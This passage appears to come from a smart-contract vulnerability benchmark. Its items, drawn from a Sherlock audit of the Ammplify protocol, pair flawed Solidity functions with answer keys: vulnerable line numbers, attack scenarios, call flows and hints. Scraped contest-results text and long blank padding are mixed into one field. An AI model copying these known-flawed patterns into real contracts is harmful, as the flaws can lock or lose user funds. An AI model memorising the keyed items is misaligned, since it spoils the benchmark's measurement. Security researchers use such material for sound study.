            "content": "    function testDecomposeNFT_incorrectLiquidityOffset2() public {  \r\n        uint256 pos = createPosition(address(this), 3000, 70020, 70080, 1e18, 1e18);  \r\n        nfpm.setApprovalForAll(address(decomposer), true);  \r\n  \r\n        // Set reasonable price bounds - allowing full range to avoid slippage issues  \r\n        uint160 minSqrtPriceX96 = 4295128739; // Very low price  \r\n        uint160 maxSqrtPriceX96 = 1461446703485210103287273052203988822378723970341; // Very high price  \r\n        decomposer.decompose(pos, false, minSqrtPriceX96, maxSqrtPriceX96, \"\");  \r\n    }      │   │   │   ├─ [518] MockERC20::transferFrom(UniV3Decomposer: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], SimplexDiamond: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000000000000000000 [1e18])  \r\n    │   │   │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)  \r\n    │   │   │   └─ ← [Revert] STF  \r\n    │   │   └─ ← [Revert] STF  \r\n    │   └─ ← [Revert] STF  \r\n    └─ ← [Revert] STF  ",
            "vulnerable_lines": [
                60,
                61,
                62,
                63,
                64,
                65,
                66,
                67,
                68,
                69,
                70,
                71
            ],
            "vulnerable_functions": [
                "decompose"
            ]
        },
        "context_files": [],
        "call_flow": "decompose -> burn NFT -> calculate liquidityOffset (incorrect) -> newMaker -> insufficient token0 -> revert",
        "context_hint": "Rounding error accumulation - the liquidity offset calculation only accounts for one token and doesn't consider that minting across multiple segments (up to 42) amplifies rounding errors differently for each token.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M14",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-14",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "standards_violation",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "Vaults won't work with tokens that revert on a 0 value approval",
        "finding_description": "The README says current contracts in-scope shouldn't have issues with tokens that revert on a zero value approval. The contract is expected to work with tokens that revert on zero value approvals, but the E4626 vault implementation doesn't handle this case. After depositing assets, the code calls SafeERC20.forceApprove(self.token, address(self.vault), 0) to reset approval. Tokens like BNB revert when approval value is 0, causing the entire transaction to fail.",
        "attack_scenario": "1. User creates or uses an E4626 vault with BNB token\n2. User calls any function that triggers commit() with assetsToDeposit > 0\n3. Tokens are approved and deposited successfully\n4. Code attempts to reset approval to 0: forceApprove(..., 0)\n5. BNB token reverts on 0-value approval\n6. Entire transaction reverts\n7. BNB vaults become completely unusable",
        "fix_description": "No mitigation provided in the report. Team acknowledged but won't fix at this time.",
        "primary_file": {
            "path": "Ammplify/src/Vault/E4626.sol",
            "content": "    function commit(VaultE4626 storage self, VaultTemp memory temp) internal {  \r\n        uint256 assetsToDeposit = temp.vars[1];  \r\n        uint256 assetsToWithdraw = temp.vars[2];  \r\n  \r\n        if (assetsToDeposit > 0 && assetsToWithdraw > 0) {  \r\n            // We can net out and save ourselves some fees.  \r\n            if (assetsToDeposit > assetsToWithdraw) {  \r\n                assetsToDeposit -= assetsToWithdraw;  \r\n                assetsToWithdraw = 0;  \r\n            } else if (assetsToWithdraw > assetsToDeposit) {  \r\n                assetsToWithdraw -= assetsToDeposit;  \r\n                assetsToDeposit = 0;  \r\n            } else {  \r\n                // Perfect net!  \r\n                return;  \r\n            }  \r\n        }  \r\n  \r\n        if (assetsToDeposit > 0) {  \r\n            // Temporary approve the deposit.  \r\n            SafeERC20.forceApprove(self.token, address(self.vault), assetsToDeposit);  \r\n            self.totalVaultShares += self.vault.deposit(assetsToDeposit, address(this));  \r\n            SafeERC20.forceApprove(self.token, address(self.vault), 0);  \r\n        } else if (assetsToWithdraw > 0) {  \r\n            // We don't need to hyper-optimize the receiver.  \r\n            self.totalVaultShares -= self.vault.withdraw(assetsToWithdraw, address(this), address(this));  \r\n        }  \r\n    }  Help Center\r\nConnect\r\nContests\r\n\r\nAmmplify\r\nAmmplify\r\nAmmplify\r\nFinished\r\nAmmplify is the first AMM LP Amplifier that improves yield on existing AMM LP positions without any increase in impermanent loss. It works by segmenting LP positions into shared buckets, applying smart auto-compounding, and enabling piece-wise pooled lending for overlapping liquidity ranges.\r\n\r\nDetails\r\n\r\nScope\r\n\r\nContest Results\r\n709\r\nIssues\r\n\r\n13\r\nHigh\r\n\r\n23\r\nMedium\r\n\r\n369\r\nInvalid\r\n\r\n58\r\n\r\nAll taker collateral and collected fees can be stolen by re-entering via `RFTLib.settle` to manipulate uniswap spot price when adding Maker liquidity\r\n\r\nH\r\npanprog\r\n\r\n$4,432\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n422\r\n\r\nIncorrect inside fees calculation for uninitialized uniswap ticks causes positions funds being stuck in the contract and allows to steal all taker collateral and collected fees\r\n\r\nH\r\npanprog\r\n\r\n$4,432\r\n\r\n428\r\n\r\nTakers pay significantly higher fees due to borrow amounts being split into children intervals\r\n\r\nH\r\npanprog\r\n\r\n$4,432\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n358\r\n\r\nTaker Fee Miscalculation Due to Annualised Rate Not Scaled to Seconds\r\n\r\nH\r\nSOPROBRO\r\n\r\n$1,196\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n417\r\n\r\nUser can lose all funds when creating or increasing compounded Maker position due to share inflation first deposit attack in any segment of the user's range\r\n\r\nH\r\npanprog\r\n\r\n$1,196\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n389\r\n\r\nDirty sibling liquidity not reallocated after parent borrow causes unallocated positions and incorrect fee accounting\r\n\r\nH\r\nblockace\r\n\r\n$1,196\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n349\r\n\r\n`View::queryAssetBalances` does not account for JIT penalties\r\n\r\nM\r\ntedox\r\n\r\n$886\r\n\r\n464\r\n\r\n`ViewFacet.queryAssetBalances` doesn't unclude uncollected uniswap fees for compounded maker position\r\n\r\nM\r\npanprog\r\n\r\n$886\r\n\r\n722\r\n\r\nThe protocol doesnt support weird tokens like Tether Gold (that return false on every operation)\r\n\r\nM\r\nanonymousjoe\r\n\r\n$886\r\n\r\n334\r\n\r\nparent `subtreeBorrowedX/Y` is not aggregated during non visit propagation in `LiqWalker.up()`\r\n\r\nH\r\nBoyD\r\n\r\n$581\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n295\r\n\r\nLeft-shift overflow in `getEquivalentLiq` corrupts value math\r\n\r\nM\r\nK42\r\n\r\n$398\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n36\r\n\r\nMaker will lose compounded gains to an attacker that claims them as fees\r\n\r\nH\r\nPeter1992\r\n\r\n$336\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n190\r\n\r\nUniV3Decomposer dust sweep will divert residual tokens from users\r\n\r\nH\r\nJeRRy0422\r\n\r\n$264\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n2\r\n\r\nDoS of pool if uniswapV3MintCallback's tokenAmountOwed is 0 for a `Revert on Zero Value Transfers` token.\r\n\r\nM\r\nADM_\r\n\r\n$239\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n261\r\n\r\nUnchecked Underflow in TreeTickLib Causes Transaction Revert in Route Creation\r\n\r\nM\r\n0xapple\r\n\r\n$239\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n44\r\n\r\n`Taker.sol` does not account for tokens with the property \"Transfer of less than amount\"\r\n\r\nM\r\ntedox\r\n\r\n$161\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n402\r\n\r\nVaults won't work with tokens that revert on a 0 value approval\r\n\r\nM\r\nholtzzx\r\n\r\n$161\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n381\r\n\r\nFee curve utilization cast to uint64 wraps 100% utilization to zero, minimizing fees\r\n\r\nM\r\nblockace\r\n\r\n$161\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n183\r\n\r\nPending Owner cannot accept ownership because of wrong implementation of `transferOwnership` and `acceptOwnership` functions\r\n\r\nM\r\nv_2110\r\n\r\n$116\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n336\r\n\r\nWide cross-zero ranges revert (InvertedRange) due to sign-loss in tick→index and no wrap support\r\n\r\nM\r\nweb3made\r\n\r\n$116\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n342\r\n\r\nIncorrect Scaling of Compounding Liquidity in Fee Distribution\r\n\r\nH\r\nSOPROBRO\r\n\r\n$115\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n42\r\n\r\nUniV3Decomposer::tokenRequestCB() can never be reached leading to residual being stuck\r\n\r\nM\r\nKlosMitSoss\r\n\r\n$87\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n4\r\n\r\nAmmplify Protocol Uses Manipulatable slot0() Price Without TWAP Protection - Price Oracle Manipulation\r\n\r\nH\r\nspaceleaf\r\n\r\n$67\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n41\r\n\r\nCompounding maker position can never be removed\r\n\r\nM\r\nKlosMitSoss\r\n\r\n$67\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n106\r\n\r\nInconsistent Tick Range Handling in modify and settle Functions\r\n\r\nH\r\nTheseersec\r\n\r\n$48\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n3\r\n\r\nJIT penalty on fresh fees can be bypassed\r\n\r\nM\r\nx15\r\n\r\n$34\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n320\r\n\r\nThe Maker contract locks JIT penalty fees due to flawed withdrawal sequencing.\r\n\r\nM\r\nroshark\r\n\r\n$34\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n6\r\n\r\nViewWalker Cross-Assignment Bug Causes Incorrect Fee Calculations\r\n\r\nM\r\njayjoshix\r\n\r\n$23\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n49\r\n\r\nadjustMaker reverts on out of range positions.\r\n\r\nM\r\nsupernova\r\n\r\n$23\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n17\r\n\r\nAn attacker will drain the diamond’s token balances via a fake Uniswap V3 pool\r\n\r\nH\r\nP00\r\n\r\n$22\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n80\r\n\r\nAny user with a small NFPM position will trigger arithmetic underflow and block their migration.\r\n\r\nM\r\nElroi\r\n\r\n$13\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n68\r\n\r\nadjustMaker ignores recipient parameter when removing liquidity, violating interface contract\r\n\r\nM\r\nSanketKogekar\r\n\r\n$13\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n94\r\n\r\nNFTManager will break NFT metadata for users as tokenURI() will revert\r\n\r\nM\r\nJeRRy0422\r\n\r\n$9\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n161\r\n\r\nPotential JIT penalties on makers\r\n\r\nM\r\ndavuka\r\n\r\n$5\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n133\r\n\r\ntransferVaultBalance function is unusable and mistransfers user's funds due to hardcoded asset ID\r\n\r\nM\r\n_Ranjan2003\r\n\r\n$2\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n20\r\n\r\nAn attacker can block a user from opening new Maker/Taker positions by “donating” 16 unwanted Maker assets, saturating their asset quota\r\n\r\nM\r\nP00\r\n\r\n$1\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n9\r\n\r\nMalicious ERC4626 Vaults Can Reenter and Manipulate Protocol State During Transfers\r\n\r\nI\r\nspaceleaf\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\